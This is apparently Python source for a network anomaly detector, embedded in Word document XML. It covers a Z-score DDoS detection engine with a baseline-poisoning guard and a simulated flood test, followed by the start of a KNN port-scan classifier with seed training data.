    <w:p w14:paraId="7433E1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4F84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window_size=30, threshold=3.0, guard_baseline=True,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56AA5F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min_pps=500, required_consecutive=1):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="611D58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self.window_size = window_size</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DD38C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self.threshold = threshold</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77B385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high Z-score only means "unusual for this host". Requiring a</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D075D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meaningful absolute packet rate prevents small changes such as</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E9D53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10 -&gt; 50 PPS from being mislabeled as a volumetric DDoS attack.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5486F4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self.min_pps = max(0, float(min_pps))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="586784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self.required_consecutive = max(1, int(required_consecutive))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="165F52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self.anomaly_streak = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61F7FB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guard_baseline=False reproduces the naive estimator for comparison</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0183E1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self.guard_baseline = guard_baseline</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B675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self.history = collections.deque(maxlen=window_size)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="062204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0054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Welford accumulators (whole session, constant memory)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41AB57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= 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65538E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self.w_mean = 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="518A5A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self.w_m2 = 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43ACD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self.peak = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59E420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self.suppressed = 0     # observations kept out of the baseline</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FB01F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B05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@property</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01806D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max_detectable_z(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36F3E3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"""Theoretical ceiling on the z-score of one outlier: (n-1)/sqrt(n)."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="455AD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 = len(self.history)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="497EE3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 &lt; 2:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23F82E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</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03299F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(n - 1) / math.sqrt(n)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6ECF86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7399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online update -------------------------------------------------</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FCB2C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update(self, packet_count):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="206F70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self.history.append(packet_count)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E2B442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E319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Welford incremental update</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F5496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+= 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B2A86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delta = packet_count - self.w_mean</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="596FF3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self.w_mean += delta / self.count</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36D1A5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self.w_m2 += delta * (packet_count - self.w_mean)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23BF302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A7E0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packet_count &gt; self.peak:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B5B6F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self.peak = packet_count</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DD7308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6CD9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calculate_baseline(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21D06C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"""Rolling-window mean and population standard deviation."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53D845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len(self.history) &lt; 2:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2ADD03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0.0, 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BCBA8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FCA9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data = list(self.history)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E0980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 = len(data)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D88D1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 = sum(data) / n</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64CC220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4239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population variance (we want the actual spread, not a sample estimate)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3595ED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var = sum((x - mean) ** 2 for x in data) / n</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53D154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return mean, math.sqrt(var)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20A0A9D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A0B1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welford_baseline(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05D62D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"""Session-wide mean and population standard deviation, O(1) memory."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04A822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self.count &lt; 2:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="414D2D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self.w_mean, 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48E6DF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self.w_mean, math.sqrt(self.w_m2 / self.count)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C1F7A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A7FF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z_of(self, packet_count):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DFF3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"""Z = (x - mu) / sigma against the rolling baseline."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="530A35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mean, std = self.calculate_baseline()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49B3B2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std &lt;= 0:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DE669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</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B7A97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(packet_count - mean) / std</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="090060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7766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uniform engine interface (NFR-5) ------------------------------</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="759140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packets_per_second, update=True):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60693B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"""Score an observation against the baseline, then update it.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="401D78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98DA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Two corrections to the naive estimator are applied here, and together</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14146C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they are what lifts flood recall:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E8E7F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B9AA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1. Predict-then-update. The observation is scored against the baseline</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CD43F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*as it stood before the observation arrived*. Folding the sample in</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05A451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first inflates the mean and the standard deviation with the very</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BCAA6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spike being measured, capping any single outlier at (n-1)/sqrt(n)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="786A17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and hiding genuine floods.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1908777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DAC5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2. Baseline poisoning guard. An observation judged anomalous is not</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07E4FE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admitted into the baseline. Without this, a sustained flood is</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="770771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absorbed within `window_size` seconds: the mean climbs to attack</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="739CC6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volume, the z-score decays to zero and the alert silently stops</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="608776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while the attack is still running. This failure mode is the direct</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47CFF8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cause of the low flood recall reported for the naive estimator.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10878C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3B131E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mean, std = self.calculate_baseline()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6794D5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CDF8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warm = len(self.history) &gt;= self.MIN_WARMUP</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FBEFD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 = (packets_per_second - mean) / std if std &gt; 0 else 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CFFBF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statistical_anomaly = bool(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A649B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warm and std &gt; 0 and z &gt; self.threshold)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00BCD2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volume_candidate = bool(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66EF77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statistical_anomaly and packets_per_second &gt;= self.min_pps)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BC0E91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BA0E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volume_candidate:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36CC84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self.anomaly_streak += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EF29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1BB963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self.anomaly_streak = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="321FEB9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9E5C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is_threat = bool(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F58D1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volume_candidate</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D5C56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and self.anomaly_streak &gt;= self.required_consecutive)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A6B7E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new_threat = bool(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48E90F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volume_candidate</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="300052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and self.anomaly_streak == self.required_consecutive)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="175CB8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2961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Keep genuine high-volume candidates out of the baseline while their</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D8ED9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persistence is being confirmed. Low-volume statistical changes are</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C454C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normal operating drift and must be allowed to update the baseline.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1984A2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update and not (volume_candidate and self.guard_baseline):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="105E2F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self.update(packets_per_second)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="086381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volume_candidate:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C73C8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self.suppressed += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30D46FB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CED7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map z onto 0..1 so the risk scorer has a confidence signal</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A28C5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confidence = (</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0928F5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min(1.0, abs(z) / (self.threshold * 2))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0367B2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volume_candidate and std &gt; 0 else 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C2AEE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55FAEE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Verdict(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="169671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"DDoS" if is_threat else "Normal",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="248732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confidence=confidence,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71B5E4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detail={"z_score": round(z, 4), "mean": round(mean, 2),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A0BFB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"std_dev": round(std, 4), "pps": packets_per_second,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68BC91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"warm": warm, "baseline_samples": len(self.history),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2528BA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"statistical_anomaly": statistical_anomaly,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="268A3F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"volume_candidate": volume_candidate,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20B47C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"min_pps": self.min_pps,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="471665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"anomaly_streak": self.anomaly_streak,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4153BF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"required_consecutive": self.required_consecutive,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44F5D9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"new_threat": new_threat},</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26ADD7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is_threat=is_threat,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7642BE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)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="799BAE8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842E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samples):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DE809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"""Warm the baseline from an iterable of packets-per-second values."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09CA36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seen = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DA092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value in samples:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="042876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isinstance(value, (list, tuple)):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F4B83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value = value[0]        # tolerate (pps, label) rows</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F110F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self.update(float(value))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C8DD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seen += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29AEE4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mean, std = self.welford_baseline()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3580BC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print("[ZS ] %d observations mean=%.2f std=%.2f peak=%d"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26C37E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(seen, mean, std, self.peak))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34DDBE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{"samples": seen, "mean": mean, "std_dev": std, "peak": self.peak}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39F46A8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A720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56A1F9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</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EF0FA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"window_size": self.window_size,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DD1BE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"threshold": self.threshold,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="127A61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"guard_baseline": self.guard_baseline,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BF958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"min_pps": self.min_pps,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27B51F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"required_consecutive": self.required_consecutive,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A8B43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"count": self.count,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B9707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"mean": self.w_mean,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C0227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"m2": self.w_m2,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29B2DD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"peak": self.peak,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DF0FC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"history": list(self.history),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="310A92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DA00B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DD9F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742A89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isinstance(data, dict):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EE29D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76C8BB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Restore learned observations, but keep the current runtime policy</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DD04D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authoritative. Otherwise an old brain file silently overrides newer</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B39AE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CLI/config values such as threshold, window, and minimum PPS.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3ED5C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= int(data.get("count", 0))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A69DE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self.w_mean = float(data.get("mean", 0.0))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A93D8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self.w_m2 = float(data.get("m2", 0.0))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54F1E5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self.peak = int(data.get("peak", 0))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EFA7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self.history = collections.deque(data.get("history", []),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49A42D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maxlen=self.window_size)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A8500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self.anomaly_streak = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B5FD4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Federated Learning: Z-Score restored baseline "</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="467973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"(mean=%.2f over %d observations)." % (self.w_mean, self.count))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C50C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02EFD1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3679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reset(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55E35B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self.history.clear()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E472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= 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B3A84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self.w_mean = 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F0970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self.w_m2 = 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58385A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self.peak = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04F418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self.suppressed = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="236DC3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self.anomaly_streak = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44FF1D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0A23028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254F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7767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5BA1E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baseline_traffic = [10, 12, 11, 10, 13, 9, 11, 12, 10, 11]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="501F532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C6D4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 = MinimalistStats(window_size=10)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52D781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pps in baseline_traffic:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="308166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s.update(pps)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F3E11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wm, wsd = s.welford_baseline()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B33506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A0F3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Welford must agree with the textbook two-pass formula</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BB43F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mean = sum(baseline_traffic) / len(baseline_traffic)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D0746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ref = math.sqrt(sum((x - mean) ** 2 for x in baseline_traffic)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B1E8B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/ len(baseline_traffic))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DED76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print("welford  mean=%.4f std=%.4f" % (wm, wsd))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79E5F8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print("two-pass mean=%.4f std=%.4f  (delta=%.2e)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0671F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(mean, ref, abs(ref - wsd)))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E2C1F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print("max detectable z for a single outlier (n=%d): %.3f"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DB3DA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(len(s.history), s.max_detectable_z))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57C8ED9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4EBA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A sustained 60-second flood: how many seconds does each variant catch?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3154BC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flood = [8000] * 60</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AC6CC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print("\nsustained flood of %d seconds at 8000 pps" % len(flood))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57A3F2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guarded in (False, True):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47919E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 = MinimalistStats(window_size=10, threshold=3.0,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3872BF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guard_baseline=guarded)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="251714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eng.train(baseline_traffic)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="018800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caught = sum(1 for pps in flood if eng.analyse(pps).is_threat)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59988F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guard_baseline=%-5s -&gt; detected %2d/%d seconds (recall %.2f)"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CC49C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(guarded, caught, len(flood), caught / len(flood)))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DAFF381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src/engines/knn.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="521D7387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(261 lines)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EE5EF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662DDC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Counter</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="086C123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046C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try:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05D488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engines.base import DetectionEngine, Verdict</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="458002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except ImportError:  # allow `python engines/knn.py` direct execution</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AE6CA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base import DetectionEngine, Verdict</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62EFA27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3983C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8158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KNNMonitor(DetectionEngine):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="402C7C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"""K-nearest neighbours classifier for port-scan versus normal traffic.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05A43F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216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per one-second interval:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="612E8F9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488F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0. unique destination ports</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44C222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1. packet count</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66B5B0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2. ports / packets  (derived)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6338813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C0EF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 2 is engineered rather than measured, and it is what makes the two</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49BB30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classes linearly separable. The first two features overlap badly at the</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D41B4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decision boundary - 27 ports over 160 packets is ordinary browsing while</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CBD91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30 ports over 40 packets is a scan, and no threshold on either raw axis</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F7AA2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separates them. Their ratio does, because it encodes the protocol</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EBB45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behaviour directly: a scanner sends about one SYN per port and never</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="316176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completes a handshake, so its ratio approaches 1, whereas a real client</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0310B0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exchanges many packets over a handful of ports and its ratio stays low.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="325184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62C6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ratio is derived at classification time, so stored training data and</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7474D0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previously saved brain files keep the original [ports, packets, label]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="407276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shape and remain loadable.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="023E1F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245CE4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B8DA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"knn"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="409BAE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("unique_ports", "packet_count", "ports_per_packet")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F7274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MIN_SCAN_PORTS = 10</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54E5C1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MIN_SCAN_RATIO = 0.20</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D472A5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30E1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k=3):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="343714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 = k</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4010DB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self.training_data = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61CB42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BB26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Seed data so we work on first boot. Modern sites can hit</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FC165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10-15 ports easily because of CDNs/ads, so don't go lower.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="596681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</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C915B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final four rows cover high-volume / low-port-diversity traffic.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F5DB7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They are labelled Normal because this engine answers exactly one</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4949AD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question - "is this a port scan?" - and a volumetric flood is not one;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A963F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it is the Z-Score engine's responsibility. Without these rows the</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61118E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region is unpopulated, so a 1-port 1500-pps flood falls nearest the</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7989CD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high-magnitude Scan samples and is misreported as a scan.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="369B2C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seed = [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A029E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[1, 5, "Normal"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="518BE6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[5, 25, "Normal"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F0DBB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[10, 50, "Normal"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CCC22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[15, 80, "Normal"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E5B36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[1, 800, "Normal"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C54AB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[2, 2000, "Normal"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="773D96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[3, 6000, "Normal"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10CB1B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[1, 15000, "Normal"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AD9D3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[30, 40, "Scan"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7197D4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[50, 60, "Scan"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68B667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[100, 200, "Scan"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38A01D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[500, 1000, "Scan"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="718B67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0C00A1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self.training_data.extend(seed)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F35F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self._ranges = None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="253C59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KNN Initialized with %d training samples." % len(self.training_data))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="175337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874D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euclidean_distance(self, p1, p2):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57C65D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math.sqrt(sum((a - b) ** 2 for a, b in zip(p1, p2)))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7008C14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EAE7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feature engineering and scaling --------------------------------</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40C4DF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@staticmethod</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BC423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def _features(unique_ports, packet_count):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E8030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"""Build the full feature vector, deriving the ports/packets ratio."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66C386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 = float(unique_ports)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="761864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pkts = float(packet_count)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20CA16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[ports, pkts, ports / pkts if pkts &gt; 0 else 0.0]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03DCA1D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3A52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feature_ranges(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="528A79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"""Per-feature (min, max) taken from the training set, cached.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25601A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F758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Euclidean distance is not scale invariant. `packet_count` spans roughly</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="160D56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5-15000 while `unique_ports` spans 1-500, so an unscaled metric is</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18B073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dominated almost entirely by the packet count, and the port dimension -</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="444D31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 feature that actually defines a scan - contributes almost nothing.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6071C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Min-max normalising every axis onto [0, 1] restores equal weight.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0883D4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44762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self._ranges is None:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04ED5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not self.training_data:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="202E37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self._ranges = [(0.0, 1.0)] * 3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="280C11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else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="721608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vectors = [self._features(r[0], r[1])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="523FC0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for r in self.training_data]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72C7D5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self._ranges = [(min(v[i] for v in vectors),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="775926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max(v[i] for v in vectors))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="321EE6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for i in range(3)]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6680CC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self._ranges</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7624CE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1F92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_scale(self, vector):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F5653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scaled = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DC723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value, (low, high) in zip(vector, self.feature_ranges()):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BB5D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span = high - low</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A0BBE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scaled.append((float(value) - low) / span if span &gt; 0 else 0.0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FA82F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scaled</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="423B3A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2CE6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@classmethod</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="569451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_is_plausible_scan(cls, ports, pkts):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="131915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ratio = ports / pkts if pkts &gt; 0 else 0.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="445B70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bool(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02EF08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pkts &gt; 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2735F0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and cls.MIN_SCAN_PORTS &lt;= ports &lt;= pkts</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B674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and ratio &gt;= cls.MIN_SCAN_RATIO</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24F443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49CAFB7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1D18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@classmethod</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76387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_sanitise_training_data(cls, samples):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="708533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"""Validate binary KNN rows and repair impossible Scan labels."""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="411B8A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cleaned = []</w:t>
      </w:r>
    </w:p>
